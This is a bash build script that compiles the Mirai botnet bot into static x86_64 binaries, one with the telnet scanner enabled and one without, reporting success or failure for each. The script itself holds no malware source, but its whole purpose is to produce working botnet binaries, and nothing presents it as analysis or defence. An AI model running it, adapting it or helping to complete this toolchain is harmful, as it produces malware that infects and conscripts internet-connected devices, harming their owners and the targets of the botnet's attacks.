#!/bin/bash

echo "=== Building Mirai Bot for x86_64 ==="

# Create release directory
mkdir -p release

# Common flags to fix multiple definition errors
CFLAGS="-std=c99 -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -fcommon"

# Build bot with telnet scanner (x86_64)
gcc $CFLAGS bot/*.c -DMIRAI_TELNET -DMIRAI_BOT_ARCH=\"x86_64\" -static \
    -o release/mirai.x86_64

if [ $? -eq 0 ]; then
    echo "[OK] Bot built: release/mirai.x86_64"
    ls -lh release/mirai.x86_64
else
    echo "[FAIL] Bot build failed"
fi

# Build bot without scanner (optional)
gcc $CFLAGS bot/*.c -static -o release/miraint.x86_64

if [ $? -eq 0 ]; then
    echo "[OK] Bot (no scanner) built: release/miraint.x86_64"
else
    echo "[FAIL] Bot (no scanner) build failed"
fi

echo ""
echo "Done!"